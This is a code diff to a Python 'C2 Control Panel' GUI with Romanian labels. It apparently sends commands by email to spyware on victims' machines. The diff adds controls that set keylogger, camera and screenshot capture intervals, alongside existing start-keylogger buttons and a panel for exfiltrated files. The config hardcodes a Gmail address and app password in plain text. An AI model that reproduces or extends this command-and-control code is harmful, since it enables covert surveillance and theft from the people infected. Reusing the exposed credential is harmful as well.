@@ -1,4 +1,3 @@
-
 import smtplib
 import threading
 import time
@@ -12,12 +11,13 @@ from email.mime.text import MIMEText
 EMAIL_CONFIG = {
     'smtp_server': 'smtp.gmail.com',
     'smtp_port': 587,
-    'sender_email': 'romanbogdan475@gmail.com',      # Folosește acest cont
-    'sender_password': 'cxzv ddop qosk hvdy',        # App Password-ul tău
+    'sender_email': 'romanbogdan475@gmail.com',
+    'sender_password': 'cxzv ddop qosk hvdy',
 }
 
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("blue")
+
 
 class EmailC2:
     def __init__(self):
@@ -28,7 +28,7 @@ class EmailC2:
         try:
             msg = MIMEMultipart()
             msg['From'] = EMAIL_CONFIG['sender_email']
-            msg['To'] = EMAIL_CONFIG['sender_email']      # Trimite către același cont
+            msg['To'] = EMAIL_CONFIG['sender_email']
             msg['Subject'] = f"COMMAND: {command}"
             msg.attach(MIMEText(f"Command: {command}\nSent at: {datetime.now()}", 'plain'))
 
@@ -48,7 +48,7 @@ class C2GUI(ctk.CTk):
     def __init__(self):
         super().__init__()
         self.title("C2 Control Panel")
-        self.geometry("820x780")
+        self.geometry("860x780")
 
         self.c2 = EmailC2()
 
@@ -63,9 +63,13 @@ class C2GUI(ctk.CTk):
                                          font=ctk.CTkFont(size=14))
         self.status_label.pack(pady=10)
 
-        # Set Recipient
-        recipient_frame = ctk.CTkFrame(self)
-        recipient_frame.pack(pady=10, padx=80, fill="x")
+        # ==================== SCROLLABLE FRAME ====================
+        self.scroll_frame = ctk.CTkScrollableFrame(self)
+        self.scroll_frame.pack(pady=10, padx=20, fill="both", expand=True)
+
+        # ==================== SET RECIPIENT ====================
+        recipient_frame = ctk.CTkFrame(self.scroll_frame)
+        recipient_frame.pack(pady=10, padx=20, fill="x")
 
         ctk.CTkLabel(recipient_frame, text="Adresă de recepție:", 
                      font=ctk.CTkFont(size=14)).pack(pady=(10,5))
@@ -77,9 +81,32 @@ class C2GUI(ctk.CTk):
         ctk.CTkButton(recipient_frame, text="Set Recipient Email", height=40, fg_color="orange",
                       command=self.set_recipient).pack(pady=10)
 
-        # Butoane
-        btn_frame = ctk.CTkFrame(self)
-        btn_frame.pack(pady=20, padx=80, fill="x")
+        # ==================== SET INTERVALS ====================
+        interval_frame = ctk.CTkFrame(self.scroll_frame)
+        interval_frame.pack(pady=10, padx=20, fill="x")
+
+        ctk.CTkLabel(interval_frame, text="Setare Intervale Individuale", 
+                     font=ctk.CTkFont(size=16, weight="bold")).pack(pady=(10,5))
+
+        self.interval_type = ctk.CTkComboBox(interval_frame, values=[
+            "Keylogger Interval", 
+            "Camera Interval", 
+            "Screenshot Interval", 
+            "Check Interval"
+        ])
+        self.interval_type.set("Keylogger Interval")
+        self.interval_type.pack(pady=5, padx=20, fill="x")
+
+        self.interval_entry = ctk.CTkEntry(interval_frame, height=40, 
+                                           placeholder_text="Valoare în secunde (ex: 30)")
+        self.interval_entry.pack(pady=5, padx=20, fill="x")
+
+        ctk.CTkButton(interval_frame, text="Set Selected Interval", height=40, 
+                      fg_color="teal", command=self.set_specific_interval).pack(pady=10)
+
+        # ==================== BUTOANE ====================
+        btn_frame = ctk.CTkFrame(self.scroll_frame)
+        btn_frame.pack(pady=20, padx=20, fill="x")
 
         buttons = [
             ("▶ Start Keylogger", "green", "START_KEYLOGGER"),
@@ -96,9 +123,9 @@ class C2GUI(ctk.CTk):
                                 command=lambda c=cmd: self.send_command(c))
             btn.pack(pady=6, fill="x")
 
-        # Fișiere primite
-        files_frame = ctk.CTkFrame(self)
-        files_frame.pack(pady=20, padx=80, fill="both", expand=True)
+        # ==================== FIȘIERE PRIMITE ====================
+        files_frame = ctk.CTkFrame(self.scroll_frame)
+        files_frame.pack(pady=20, padx=20, fill="both", expand=True)
 
         ctk.CTkLabel(files_frame, text="Fișiere primite:", 
                      font=ctk.CTkFont(size=18, weight="bold")).pack(pady=10)
@@ -115,6 +142,30 @@ class C2GUI(ctk.CTk):
             self.status_label.configure(text=f"✅ Adresă setată: {email}")
         else:
             self.status_label.configure(text="❌ Introduce o adresă validă!")
+
+    def set_specific_interval(self):
+        value = self.interval_entry.get().strip()
+        interval_type = self.interval_type.get()
+
+        if not value:
+            self.status_label.configure(text="❌ Introdu un interval!")
+            return
+
+        try:
+            interval = int(value)
+            if interval > 0:
+                mapping = {
+                    "Keylogger Interval": "SET_KEY_INTERVAL",
+                    "Camera Interval": "SET_CAMERA_INTERVAL",
+                    "Screenshot Interval": "SET_SCREENSHOT_INTERVAL",
+                    "Check Interval": "SET_CHECK_INTERVAL"
+                }
+                self.c2.send_command(f"{mapping[interval_type]}:{interval}")
+                self.status_label.configure(text=f"✅ {interval_type} setat: {interval} sec")
+            else:
+                self.status_label.configure(text="❌ Interval invalid!")
+        except ValueError:
+            self.status_label.configure(text="❌ Introdu un număr valid!")
 
     def send_command(self, command):
         self.status_label.configure(text=f"📤 Se trimite: {command} ...")
